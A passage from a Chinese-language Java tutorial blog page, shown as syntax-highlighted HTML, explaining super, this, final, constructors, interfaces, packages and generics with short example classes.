class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">implements</span> <span class="title">A</span>,<span class="title">B</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="super-与-this-关键字"><a href="#super-与-this-关键字" class="headerlink" title="super 与 this 关键字"></a>super 与 this 关键字</h3><p>super关键字：我们可以通过super关键字来实现<strong>对父类成员的访问</strong>，用来引用当前对象的父类。</p><p>this关键字：指向自己的引用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Main.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Animal a = <span class="keyword">new</span> Animal();</span><br><span class="line">        a.eat();</span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------&quot;</span>);</span><br><span class="line">        Dog d = <span class="keyword">new</span> Dog();</span><br><span class="line">        d.eatTest();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Animal.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;animal:eat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Dog.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;dog:eat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">eatTest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.eat();<span class="comment">//eat调用父类的方法</span></span><br><span class="line">        <span class="keyword">this</span>.eat();<span class="comment">//this调用自己的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果为：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305161531197.png"></p><h3 id="final-关键字"><a href="#final-关键字" class="headerlink" title="final 关键字"></a>final 关键字</h3><p>final 可以用来修饰变量（包括类属性、对象属性、局部变量和形参）、方法（包括类方法和对象方法）和类。</p><p>final 含义为 “最终的”。</p><p>使用 final 关键字声明类，就是把类定义定义为最终类，不能被继承，或者用于修饰方法，该方法不能被子类重写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明类</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> 类名 </span>&#123;<span class="comment">//类体&#125;</span></span><br><span class="line"><span class="comment">//声明方法</span></span><br><span class="line">修饰符(<span class="keyword">public</span>/<span class="keyword">private</span>/<span class="keyword">default</span>/<span class="keyword">protected</span>) <span class="keyword">final</span> 返回值类型 方法名()&#123;<span class="comment">//方法体&#125;</span></span><br></pre></td></tr></table></figure><p><strong>注：</strong> final 定义的类，其中的属性、方法不是 final 的。</p><h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p>子类是不继承父类的构造器（构造方法或者构造函数）的，它只是调用（隐式或显式）。如果父类的构造器带有参数，则必须在子类的构造器中显式地通过 <strong>super</strong> 关键字调用父类的构造器并配以适当的参数列表。</p><p>如果父类构造器没有参数，则在子类的构造器中不需要使用 <strong>super</strong> 关键字调用父类构造器，系统会自动调用父类的无参构造器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SuperClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line">    SuperClass()&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;SuperClass()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    SuperClass(<span class="keyword">int</span> n) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;SuperClass(int n)&quot;</span>);</span><br><span class="line">      <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// SubClass 类继承</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">SuperClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line">    </span><br><span class="line">    SubClass()&#123; <span class="comment">// 自动调用父类的无参数构造器</span></span><br><span class="line">      System.out.println(<span class="string">&quot;SubClass&quot;</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SubClass</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123; </span><br><span class="line">      <span class="keyword">super</span>(<span class="number">300</span>);  <span class="comment">// 调用父类中带有参数的构造器</span></span><br><span class="line">      System.out.println(<span class="string">&quot;SubClass(int n):&quot;</span>+n);</span><br><span class="line">      <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// SubClass2 类继承</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">SubClass2</span> <span class="keyword">extends</span> <span class="title">SuperClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line">    </span><br><span class="line">    SubClass2()&#123;</span><br><span class="line">      <span class="keyword">super</span>(<span class="number">300</span>);  <span class="comment">// 调用父类中带有参数的构造器</span></span><br><span class="line">      System.out.println(<span class="string">&quot;SubClass2&quot;</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SubClass2</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123; <span class="comment">// 自动调用父类的无参数构造器</span></span><br><span class="line">      System.out.println(<span class="string">&quot;SubClass2(int n):&quot;</span>+n);</span><br><span class="line">      <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;------SubClass 类继承------&quot;</span>);</span><br><span class="line">      SubClass sc1 = <span class="keyword">new</span> SubClass();</span><br><span class="line">      SubClass sc2 = <span class="keyword">new</span> SubClass(<span class="number">100</span>); </span><br><span class="line">      System.out.println(<span class="string">&quot;------SubClass2 类继承------&quot;</span>);</span><br><span class="line">      SubClass2 sc3 = <span class="keyword">new</span> SubClass2();</span><br><span class="line">      SubClass2 sc4 = <span class="keyword">new</span> SubClass2(<span class="number">200</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305161540154.png"></p><h1 id="重写-Override-与重载-Overload"><a href="#重写-Override-与重载-Overload" class="headerlink" title="重写(Override)与重载(Overload)"></a>重写(Override)与重载(Overload)</h1><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以<code>interface</code>来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p><p>接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。</p><p>除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。</p><p>接口无法被实例化，但是可以被实现。<strong>一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类</strong>。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。</p><h2 id="接口与类相似点："><a href="#接口与类相似点：" class="headerlink" title="接口与类相似点："></a>接口与类相似点：</h2><ul><li>一个接口可以有多个方法。</li><li>接口文件保存在 .java 结尾的文件中，文件名使用接口名。</li><li>接口的字节码文件保存在 .class 结尾的文件中。</li><li>接口相应的字节码文件必须在与包名称相匹配的目录结构中。</li></ul><h2 id="接口与类的区别："><a href="#接口与类的区别：" class="headerlink" title="接口与类的区别："></a>接口与类的区别：</h2><ul><li>接口不能用于实例化对象。</li><li>接口没有构造方法。</li><li>接口中所有的方法必须是抽象方法，Java 8 之后 接口中可以使用 default 关键字修饰的非抽象方法。</li><li>接口不能包含成员变量，除了 static 和 final 变量。</li><li>接口不是被类继承了，而是要被类实现。</li><li>接口支持多继承。</li></ul><h2 id="接口特性"><a href="#接口特性" class="headerlink" title="接口特性"></a>接口特性</h2><ul><li>接口中每一个方法也是隐式抽象的,接口中的<strong>方法</strong>会被隐式的指定为 <strong>public abstract</strong>（只能是 public abstract，其他修饰符都会报错）。</li><li>接口中可以含有变量，但是接口中的<strong>变量</strong>会被隐式的指定为 <strong>public static final</strong> 变量（并且只能是 public，用 private 修饰会报编译错误）。</li><li>接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。</li></ul><p>接口有以下特性：</p><ul><li>接口是隐式抽象的，当声明一个接口的时候，不必使用<strong>abstract</strong>关键字。</li><li>接口中每一个方法也是隐式抽象的，声明时同样不需要<strong>abstract</strong>关键字。</li><li>接口中的方法都是公有的。</li></ul><h3 id="抽象类和接口的区别"><a href="#抽象类和接口的区别" class="headerlink" title="抽象类和接口的区别"></a>抽象类和接口的区别</h3><ul><li><ol><li>抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。</li></ol></li><li><ol start="2"><li>抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 <strong>public static final</strong> 类型的。</li></ol></li><li><ol start="3"><li>接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。</li></ol></li><li><ol start="4"><li>一个类只能继承一个抽象类，而一个类却可以实现多个接口。</li></ol></li></ul><p>注：JDK 1.8 以后，接口里可以有静态方法和方法体了。</p><p>注：JDK 1.8 以后，接口允许包含具体实现的方法，该方法称为”默认方法”，默认方法使用 default 关键字修饰。更多内容可参考 Java 8 默认方法。</p><p>注：JDK 1.9 以后，允许将方法定义为 private，使得某些复用的代码不会把方法暴露出去。更多内容可参考 Java 9 私有接口方法。</p><h2 id="接口语法"><a href="#接口语法" class="headerlink" title="接口语法"></a>接口语法</h2><p>语法格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[可见度] <span class="class"><span class="keyword">interface</span> 接口名称 [<span class="keyword">extends</span> 其他的接口名] </span>&#123;</span><br><span class="line">        <span class="comment">// 声明变量</span></span><br><span class="line">        <span class="comment">// 抽象方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Interface</code>关键字用来声明一个接口。下面是接口声明的一个简单例子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件名：NameOfInterface.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="comment">//引入包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">NameOfInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//任何类型 final，static 字段</span></span><br><span class="line">    <span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件名: Animal.java</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="接口的实现"><a href="#接口的实现" class="headerlink" title="接口的实现"></a>接口的实现</h2><p><strong>当类实现接口的时候，类要实现接口中所有的方法。否则，类必须声明为抽象的类。</strong></p><p>类使用<code>implements</code>关键字实现接口。在类声明中，Implements关键字放在class声明后面。</p><p>实现一个接口的语法，可以使用这个公式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...implements 接口名称[, 其他接口名称, 其他接口名称..., ...] ...</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 文件名 : MammalInt.java */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MammalInt</span> <span class="keyword">implements</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Mammal eats&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">travel</span><span class="params">()</span></span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Mammal travels&quot;</span>);</span><br><span class="line">   &#125; </span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">noOfLegs</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">      MammalInt m = <span class="keyword">new</span> MammalInt();</span><br><span class="line">      m.eat();</span><br><span class="line">      m.travel();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果为</span></span><br><span class="line">Mammal eats</span><br><span class="line">Mammal travels</span><br></pre></td></tr></table></figure><p>重写接口中声明的方法时，需要注意以下规则：</p><ul><li>类在实现接口的方法时，不能抛出强制性异常，只能在接口中，或者继承接口的抽象类中抛出该强制性异常。</li><li>类在重写方法时要保持一致的方法名，并且应该保持相同或者相兼容的返回值类型。</li><li>如果实现接口的类是抽象类，那么就没必要实现该接口的方法。</li></ul><p>在实现接口的时候，也要注意一些规则：</p><ul><li>一个类可以同时实现多个接口。</li><li>一个类只能继承一个类，但是能实现多个接口。</li><li>一个接口能继承另一个接口，这和类之间的继承比较相似。</li></ul><h1 id="包-package"><a href="#包-package" class="headerlink" title="包(package)"></a>包(package)</h1><p>为了更好地组织类，Java 提供了包机制，用于区别类名的命名空间。</p><h3 id="包的作用"><a href="#包的作用" class="headerlink" title="包的作用"></a>包的作用</h3><ul><li>1、把功能相似或相关的类或接口组织在同一个包中，方便类的查找和使用。</li><li>2、如同文件夹一样，包也采用了树形目录的存储方式。同一个包中的类名字是不同的，不同的包中的类的名字是可以相同的，当同时调用两个不同包中相同类名的类时，应该加上包名加以区别。因此，包可以避免名字冲突。</li><li>3、包也限定了访问权限，拥有包访问权限的类才能访问某个包中的类。</li></ul><p>Java 使用包（package）这种机制是为了防止命名冲突，访问控制，提供搜索和定位类（class）、接口、枚举（enumerations）和注释（annotation）等。</p><p>包语句的语法格式为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> pkg1[．pkg2[．pkg3…]];</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.java.util;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么它的路径应该是 <strong>net/java/util/Test.java</strong> 这样保存的。 package(包) 的作用是把不同的 java 程序分类保存，更方便的被其他 java 程序调用。</p><p>一个包（package）可以定义为一组相互联系的类型（类、接口、枚举和注释），为这些类型提供访问保护和命名空间管理的功能。</p><p>以下是一些 Java 中的包：</p><ul><li><strong>java.lang</strong>——打包基础的类</li><li><strong>java.io</strong>——包含输入输出功能的函数</li></ul><p>开发者可以自己把一组类和接口等打包，并定义自己的包。而且在实际开发中这样做是值得提倡的，当你自己完成类的实现之后，将相关的类分组，可以让其他的编程者更容易地确定哪些类、接口、枚举和注释等是相关的。</p><p>由于包创建了新的命名空间（namespace），所以不会跟其他包中的任何名字产生命名冲突。使用包这种机制，更容易实现访问控制，并且让定位相关类更加简单。</p><h2 id="创建包"><a href="#创建包" class="headerlink" title="创建包"></a>创建包</h2><p>创建包的时候，你需要为这个包取一个合适的名字。之后，<strong>如果其他的一个源文件包含了这个包提供的类、接口、枚举或者注释类型的时候，都必须将这个包的声明放在这个源文件的开头</strong>。</p><p>包声明应该在源文件的第一行，每个源文件只能有一个包声明，这个文件中的每个类型都应用于它。</p><p>如果一个源文件中没有使用包声明，那么其中的类，函数，枚举，注释等将被放在一个无名的包（unnamed package）中。</p><p><strong>实例</strong>：</p><p>这个例子创建了一个叫做animals的包。通常使用小写的字母来命名避免与类、接口名字的冲突。</p><p>在 animals 包中加入一个接口（interface）：</p><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><p>泛型（generics）是 JDK 5 中引入的一个新特性, 泛型提供了编译时类型安全检测机制，该机制允许程序员在编译时检测到非法的类型。泛型的本质是参数化类型，也就是说所操作的数据类型被指定为一个参数。</p><p>假定我们有这样一个需求：写一个排序方法，能够对整型数组、字符串数组甚至其他任何类型的数组进行排序，该如何实现？</p><p>此时就可以使用 <strong>Java 泛型</strong>。</p><p>使用 Java 泛型的概念，我们可以写一个泛型方法来对一个对象数组排序。然后，调用该泛型方法来对整型数组、浮点数数组、字符串数组等进行排序。</p><h2 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h2><p>下面是定义泛型方法的规则：</p><ul><li>所有泛型方法声明都有一个类型参数声明部分（由尖括号分隔），<strong>该类型参数声明部分在方法返回类型之前</strong>（在下面例子中的 <code>&lt;E&gt;</code>）。</li><li><strong>每一个类型参数声明部分包含一个或多个类型参数，参数间用逗号隔开</strong>。一个泛型参数，也被称为一个类型变量，是用于指定一个泛型类型名称的标识符。</li><li><strong>类型参数能被用来声明返回值类型，并且能作为泛型方法得到的实际参数类型的占位符</strong>。</li><li>泛型方法体的声明和其他方法一样。注意<strong>类型参数只能代表引用型类型</strong>，不能是原始类型（像 <strong>int、double、char</strong> 等）。</li></ul><p><strong>java 中泛型标记符：</strong></p><ul><li><strong>E</strong> - Element (在集合中使用，因为集合中存放的是元素)</li><li><strong>T</strong> - Type（Java 类）</li><li><strong>K</strong> - Key（键）</li><li><strong>V</strong> - Value（值）</li><li><strong>N</strong> - Number（数值类型）</li><li><strong>？</strong> - 表示不确定的 java 类型</li></ul><p><strong>实例A</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericMethodTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 泛型方法 printArray ，它的参数是E[] inputArray</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(E[] inputArray)</span></span>&#123;  <span class="comment">//返回类型是&lt;E&gt;——在集合中使用，因为集合中存放的是元素</span></span><br><span class="line">        <span class="comment">// 输出数组元素</span></span><br><span class="line">        <span class="keyword">for</span>(E element : inputArray)&#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;%s&quot;</span> , element);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建不同类型的数组：Integer,Double,Character</span></span><br><span class="line">        Integer[] intArray = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        Double[] doubleArray = &#123;<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>&#125;;</span><br><span class="line">        Character[] charArray = &#123;<span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;A&#x27;</span>&#125;;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;整型数组元素为：&quot;</span>);</span><br><span class="line">        printArray( intArray );<span class="comment">//传递一个整型数组</span></span><br><span class="line"></span><br><span class="line">        System.out.println( <span class="string">&quot;\n双精度型数组元素为:&quot;</span> );</span><br><span class="line">        printArray( doubleArray ); <span class="comment">// 传递一个双精度型数组</span></span><br><span class="line"> </span><br><span class="line">        System.out.println( <span class="string">&quot;\n字符型数组元素为:&quot;</span> );</span><br><span class="line">        printArray( charArray ); <span class="comment">// 传递一个字符型数组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191139928.png"></p><p>编译运行结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/S1gma0/image/202305191140434.png"></p><p>有界的类型参数:</p><p>可能有时候，你会想限制那些被允许传递到一个类型参数的类型种类范围。例如，一个操作数字的方法可能只希望接受Number或者Number子类的实例。这就是有界类型参数的目的。</p><p>要声明一个有界的类型参数，首先列出类型参数的名称，后跟extends关键字，最后紧跟它的上界。</p><p><strong>实例B</strong>：</p><p>下面的例子演示了”extends”如何使用在一般意义上的意思”extends”（类）或者”implements”（接口）。该例子中的泛型方法返回三个可比较对象的最大值。</p><p><code>Comparable&lt;T&gt;</code>Java中用来对数据进行比较（排序）的接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MaximumTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="comment">// 比较三个值并返回最大值</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> &lt;T extends Comparable&lt;T&gt;&gt; <span class="function">T <span class="title">maximum</span><span class="params">(T x, T y, T z)</span></span></span><br><span class="line"><span class="function">   </span>&#123;                     </span><br><span class="line">      T max = x; <span class="comment">// 假设x是初始最大值</span></span><br><span class="line">      <span class="keyword">if</span> ( y.compareTo( max ) &gt; <span class="number">0</span> )&#123;</span><br><span class="line">         max = y; <span class="comment">//y 更大</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( z.compareTo( max ) &gt; <span class="number">0</span> )&#123;</span><br><span class="line">         max = z; <span class="comment">// 现在 z 更大           </span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> max; <span class="comment">// 返回最大对象</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String args[] )</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      System.out.printf( <span class="string">&quot;%d, %d 和 %d 中最大的数为 %d\n\n&quot;</span>,</span><br><span class="line">                   <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, maximum( <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> ) );</span><br><span class="line"> </span><br><span class="line">      System.out.printf( <span class="string">&quot;%.1f, %.1f 和 %.1f 中最大的数为 %.1f\n\n&quot;</span>,</span><br><span class="line">                   <span class="number">6.6</span>, <span class="number">8.8</span>, <span class="number">7.7</span>, maximum( <span class="number">6.6</span>, <span class="number">8.8</span>, <span class="number">7.7</span> ) );</span><br><span class="line"> </span><br><span class="line">      System.out.printf( <span class="string">&quot;%s, %s 和 %s 中最大的数为 %s\n&quot;</span>,<span 